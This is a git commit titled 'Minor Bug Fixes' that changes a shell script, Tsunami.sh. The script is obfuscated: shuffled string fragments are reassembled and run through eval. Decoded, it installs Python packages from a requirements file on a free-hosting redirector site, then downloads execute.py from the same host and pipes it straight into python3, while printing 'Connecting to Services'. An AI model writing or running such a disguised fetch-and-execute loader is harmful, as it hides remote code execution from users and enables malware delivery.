0c0c2eaea6f34fc192c233889ede13c4e6d2940e
Utsanjan <59719700+utsanjan@users.noreply.github.com>
2021-06-14 08:01:17 +0530

    Minor Bug Fixes

--- Tsunami.sh
+++ Tsunami.sh
@@ -1,3 +1,7 @@
+#!/bin/bash
 z="
-";tz='on3 ';ABz='q -O';dz='://r';Mz='-eq ';JBz='iled';iz='0web';GBz='onne';Fz='ps:/';Sz='nnec';hz='z.00';Yz='pip ';IBz='n Fa';mz='requ';Iz='gle.';Cz='--sp';Bz=' -q ';uz='<(wg';BBz='-)';Xz='..."';oz='ents';lz='com/';pz='.txt';Oz=' the';Wz='ices';sz='pyth';CBz='else';LBz='fi';wz='exec';Kz='if [';HBz='ctio';Qz='echo';Uz=' to ';gz='r-xy';az='all ';Hz='.goo';kz='app.';qz=' --q';Ez=' htt';bz='-r h';Rz=' "Co';Gz='/www';Dz='ider';ez='edir';FBz='et C';vz='et h';Jz='com';Tz='ting';EBz='tern';Pz='n';nz='irem';Az='wget';DBz=' "In';fz='ecto';Lz=' $? ';Zz='inst';Nz='0 ];';rz='uiet';Vz='Serv';cz='ttps';yz='py -';jz='host';xz='ute.';KBz='!!!"';
+";DBz=' "In';Pz='n';Uz=' to ';CBz='else';mz='requ';dz='://r';az='all ';KBz='!!!"';Wz='ices';cz='ttps';nz='irem';kz='app.';Lz=' $? ';Fz='ps:/';Gz='/www';
+qz=' --q';Bz=' -q ';Iz='gle.';fz='ecto';Nz='0 ];';xz='ute.';Rz=' "Co';Qz='echo';Ez=' htt';uz='<(wg';GBz='onne';tz='on3 ';BBz='-)';hz='z.00';Hz='.goo';Az='wget';
+iz='0web';LBz='fi';rz='uiet';lz='com/';Oz=' the';Tz='ting';ABz='q -O';Dz='ider';yz='py -';oz='ents';Zz='inst';wz='exec';HBz='ctio';gz='r-xy';Vz='Serv';Kz='if [';
+pz='.txt';Mz='-eq ';Xz='..."';vz='et h';Sz='nnec';JBz='iled';IBz='n Fa';jz='host';Cz='--sp';Jz='com';FBz='et C';sz='pyth';Yz='pip ';bz='-r h';EBz='tern';ez='edir';
 eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$z$Kz$Lz$Mz$Nz$Oz$Pz$z$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$z$sz$tz$uz$vz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$wz$xz$yz$ABz$BBz$z$CBz$z$Qz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$z$LBz"
